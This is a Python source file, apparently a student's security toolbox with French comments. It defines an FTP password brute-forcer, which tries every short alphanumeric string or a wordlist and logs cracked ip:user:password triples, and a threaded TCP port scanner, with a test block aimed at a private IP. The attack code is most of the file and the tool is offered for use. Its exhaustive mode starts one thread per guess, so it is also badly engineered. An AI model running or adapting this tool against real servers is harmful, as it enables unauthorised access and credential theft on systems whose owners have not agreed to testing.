#!/usr/bin/python
from logging import Logging
import threading, socket, ftplib, re
from datetime import datetime
from ftp import FTP
# pas de copier coller bêtement
# s'avoir expliqué votre code
# commanté les grande partie de votre code
# dev a l'interieur du if __main__
# pour pas géné l'autre partie du code
class TOOLS():
	def __init__(self) :
		self.FILE_LOG = "Folder_log/tools.log"
		self.logging = Logging(self.FILE_LOG)
		pass


	def BruteForce_nodico (self,ip,user):

		def BruteForce_pwd(ip,user,FILE,pwd):
					try:
						ftplib.FTP(ip,user,pwd)
					except:
						pass
					else:
						FILE = open(FILE,"a+") 
						FILE.write(ip +":"+ user +":"+ pwd + "\n")
						FILE.close()
		def BruteForce_thread(ip,user,FILE):
			LETRE="abcdefghijklmnopqrstuvwxyz1234567890"
			list=[]
			list[:0]=LETRE

			for l1 in list:
				threading.Thread(target=BruteForce_pwd, args=(ip,user,FILE,l1)).start()
				for l2 in list:
					threading.Thread(target=BruteForce_pwd, args=(ip,user,FILE,l1 + l2)).start()
					for l3 in list:
						threading.Thread(target=BruteForce_pwd, args=(ip,user,FILE,l1 + l2 + l3)).start()
						for l4 in list:
							threading.Thread(target=BruteForce_pwd, args=(ip,user,FILE,l1 + l2 + l3 + l4)).start()
							for l5 in list:
								threading.Thread(target=BruteForce_pwd, args=(ip,user,FILE,l1 + l2 + l3 + l4 + l5)).start()
								for l6 in list:
									threading.Thread(target=BruteForce_pwd, args=(ip,user,FILE,l1 + l2 + l3 + l4 + l5 + l6)).start()

		DATE = f'{datetime.now():%m-%d-%Y-%H-%M-%S}'
		FILE = "TOOLS/"+"BRUTE_FORCE"+DATE

		threading.Thread(target=BruteForce_thread, args=(ip,user,FILE)).start()

		return FILE



	def BruteForce_dico (self,ip,file,user):
		def BruteForce(ip,user,pwd,FILE):
			try:
				ftplib.FTP(ip,user,pwd)
			except:
				pass
			else:
				FILE = open(FILE,"a+") 
				FILE.write(ip +":"+ user +":"+ pwd + "\n")
				FILE.close()

		DATE = f'{datetime.now():%m-%d-%Y-%H-%M-%S}'
		FILE = "TOOLS/"+"BRUTE_FORCE"+DATE

		contenu = open(file,"r")
		lines = contenu.readlines()
		for pwd in lines:
			threading.Thread(target=BruteForce, args=(ip,user,pwd,FILE)).start()

		return FILE

	#TODO TRY
	def ScanPorts (self,IP,port_min,port_max):
		def Scan(IP,port,FILE):
			sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
			result = sock.connect_ex((IP,port))
			if result == 0:
				FILE = open(FILE,"a+") 
				FILE.write(str(port) + "\n")
				FILE.close()

				#METTRE DANS UN CSV
				return port
			sock.close()

		DATE = f'{datetime.now():%m-%d-%Y-%H-%M-%S}'
		FILE = "TOOLS/"+"SCAN_PORT"+DATE

		IP = str(IP)
		port_min = int(port_min)
		port_max = int(port_max)

		while port_min < port_max:
			threading.Thread(target=Scan, args=(IP,port_min,FILE)).start()
			port_min = port_min + 1
		return FILE






if __name__ == '__main__':
	print ("veillez importer le script")
	#
	# LES TESTS
	#
	boite_a_outils = TOOLS()
	IP = "172.20.20.35"








	"""
	chaine = ""
	x = 0
	while True:
		chaine = ""

		for l in list:

			chaine = l + chaine
			print (chaine)

		mv =list[0]
		del list[0]
		list.append(mv)
		if len(list) == x:
			break
		print (x)
		x = x + 1

	LETRE="ABCDC"
	list=[]
	list[:0]=LETRE


	for l in list:
		chaine = l
		print (chaine)
		for l2 in list:
			chaine = l + l2
			print (chaine)
			for l3 in list:
				chaine = l + l2 + l3
				print (chaine)
				for l4 in list:
					chaine = l + l2 + l3 + l4
					print (chaine)
					for l5 in list:
						chaine = l + l2 + l3 + l4 + l5
						print (chaine)
	"""


	# Driver code
	


else:
	print ("Le script tools a été importer avec succès")